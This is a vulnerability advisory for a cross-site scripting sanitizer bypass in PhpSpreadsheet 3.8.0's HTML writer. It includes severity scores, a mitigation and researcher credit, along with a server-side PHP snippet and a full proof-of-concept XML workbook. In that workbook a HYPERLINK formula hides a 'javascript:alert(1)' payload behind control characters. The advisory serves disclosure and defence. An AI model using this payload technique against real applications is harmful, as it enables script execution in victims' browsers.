summary: "PhpSpreadsheet allows bypassing of XSS sanitizer using the javascript protocol and\
  \ special characters\n**Product:** PhpSpreadsheet\n**Version:** 3.8.0\n**CWE-ID:** CWE-79:\
  \ Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n**CVSS\
  \ vector v.3.1:** 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n**CVSS vector v.4.0:** 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n\
  **Description:** an attacker can use special characters, so that the library processes the\
  \ javascript protocol with special characters and generates an HTML link\n**Impact:** executing\
  \ arbitrary JavaScript code in the browser\n**Vulnerable component:** class `PhpOffice\\PhpSpreadsheet\\\
  Writer\\Html`, method `generateRow`\n**Exploitation conditions:** a user viewing a specially\
  \ generated xml file\n**Mitigation:** additional sanitization of special characters in a string\n\
  **Researcher: Igor Sak-Sakovskiy (Positive Technologies)**\n\n# Research\n\nThe researcher\
  \ discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and\
  \ special characters in Phpspreadsheet.\nThe following code is written on the server, which\
  \ translates the XML file into an HTML representation and displays it in the response.\n\n\
  *Listing 4. Source code on the server*\n\n```\n<?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\
  \n$inputFileType = 'Xml';\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\
  \  \n\n$inputFileName = './doc/file.xml';\n$spreadsheet = $reader->load($inputFileName); \n\
  \ \n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet); \nprint($writer->generateHTMLAll());\n\
  ```\nThe contents of the xml file - `./doc/file.xml`\n\n*Listing 5. The contents of the xml\
  \ file*\n```\n<?xml version=\"1.0\"?> \n<?mso-application progid=\"Excel.Sheet\"?> \n<Workbook\
  \ xmlns=\"urn:schemas-microsoft-com:office:spreadsheet\" \n xmlns:o=\"urn:schemas-microsoft-com:office:office\"\
  \ \n xmlns:x=\"urn:schemas-microsoft-com:office:excel\" \n xmlns:ss=\"urn:schemas-microsoft-com:office:spreadsheet\"\
  \ \n xmlns:html=\"http://www.w3.org/TR/REC-html40\"> \n <DocumentProperties xmlns=\"urn:schemas-microsoft-com:office:office\"\
  > \n  <Author>author</Author> \n  <LastAuthor>author</LastAuthor> \n  <Created>2015-06-05T18:19:34Z</Created>\
  \ \n  <LastSaved>2024-12-25T10:16:07Z</LastSaved> \n  <Version>16.00</Version> \n </DocumentProperties>\
  \ \n <OfficeDocumentSettings xmlns=\"urn:schemas-microsoft-com:office:office\"> \n  <AllowPNG/>\
  \ \n </OfficeDocumentSettings> \n <ExcelWorkbook xmlns=\"urn:schemas-microsoft-com:office:excel\"\
  > \n  <WindowHeight>11020</WindowHeight> \n  <WindowWidth>19420</WindowWidth> \n  <WindowTopX>32767</WindowTopX>\
  \ \n  <WindowTopY>32767</WindowTopY> \n  <ProtectStructure>False</ProtectStructure> \n  <ProtectWindows>False</ProtectWindows>\
  \ \n </ExcelWorkbook> \n <Styles> \n  <Style ss:ID=\"Default\" ss:Name=\"Normal\"> \n   <Alignment\
  \ ss:Vertical=\"Bottom\"/> \n   <Borders/> \n   <Font ss:FontName=\"Calibri\" x:Family=\"\
  Swiss\" ss:Size=\"11\" ss:Color=\"#000000\"/> \n   <Interior/> \n   <NumberFormat/> \n   <Protection/>\
  \ \n  </Style> \n  <Style ss:ID=\"s16\"> \n   <NumberFormat ss:Format=\"General Date\"/> \n\
  \  </Style> \n </Styles> \n <Worksheet ss:Name=\"Лист1\"> \n  <Table ss:ExpandedColumnCount=\"\
  2\" ss:ExpandedRowCount=\"6\" x:FullColumns=\"1\" \n   x:FullRows=\"1\" ss:DefaultRowHeight=\"\
  14.5\"> \n   <Column ss:AutoFitWidth=\"0\" ss:Width=\"194\"/> \n   <Row> \n     <Cell ss:Formula=\"\
  =HYPERLINK (CHAR(20) &amp; &quot;j&quot; &amp; CHAR(13) &amp; &quot;avascript:alert(1)&quot;)\"\
  ><Data ss:Type=\"String\"></Data></Cell> \n   </Row> \n  </Table> \n  <WorksheetOptions xmlns=\"\
  urn:schemas-microsoft-com:office:excel\"> \n   <PageSetup> \n    <Header x:Margin=\"0.3\"\
  /> \n    <Footer x:Margin=\"0.3\"/> \n    <PageMargins x:Bottom=\"0.75\" x:Left=\"0.7\" x:Right=\"\
  0.7\" x:Top=\"0.75\"/> \n   </PageSetup> \n   <Selected/> \n   <TopRowVisible>1</TopRowVisible>\
  \ \n   <Panes> \n    <Pane> \n     <Number>3</Number> \n     <ActiveRow>6</ActiveRow> \n \
  \   </Pane> \n   </Panes> \n   <ProtectObjects>False</ProtectObjects> \n   <ProtectScenarios>False</ProtectScenarios>\
  \ \n  </WorksheetOptions> \n </Worksheet>\n</Workbook>\n```\n\nDue to the load with a special\
  \ character in front of the javascript protocol, the execution flow hits line 1595, not 1593.\n\
  \ \n*Figure 4. Generating a link bypassing a regular expression*\n![fig4](https://github.com/user-attachments/assets/9bd2299d-9045-4cab-b3a5-cbcaf3bbe23c)\n\
  \nIn the response from the server, you can see which special character is located in front\
  \ of the javascript protocol after conversion.\n \n*Figure 5. Response from the server with\
  \ a special character*\n![fig5](https://github.com/user-attachments/assets/3fecbd9b-b08e-4797-9f5d-06911f857059)\n\
  \nWhen viewing the rendered result, a link becomes visible in the browser, and when clicked,\
  \ the embedded JavaScript code will be executed.\n\n*Figure 6. Executing JavaScript code*\n\
  <img width=\"595\" alt=\"fig6\" src=\"https://github.com/user-attachments/assets/b8ff1aeb-ba3b-49c1-a3b4-9e2cc1fc52d1\"\
  \ />\n_____________________________________________\n\n## Credit\n\nIgor Sak-Sakovskiy (Positive\
  \ Technologies)"
